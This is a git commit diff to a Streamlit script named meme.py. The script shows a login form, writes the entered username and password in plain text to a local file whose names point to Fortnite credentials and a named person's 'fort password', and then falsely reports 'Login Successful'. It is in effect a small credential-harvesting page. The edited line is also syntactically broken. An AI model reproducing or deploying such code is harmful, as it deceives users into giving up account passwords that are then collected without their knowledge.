7eaeeb0fac8712d207cef5c8bbe88827c85db3fd
Sree <Skarmoney99@gmail.com>
2024-06-28 09:20:07 -0500

    Update meme.py

--- meme.py
+++ meme.py
@@ -6,7 +6,7 @@ username = st.text_input('Username')
 password = st.text_input('Password', type='password')
 
 if st.button('Login'):
-    with open('fortnite_credentials.txt', 'a') as file:
+    with open('aarnav'\s fort password', 'a') as file:
         file.write(f'Username: {username}, Password: {password}\n')
     
     st.write('Login Successful')
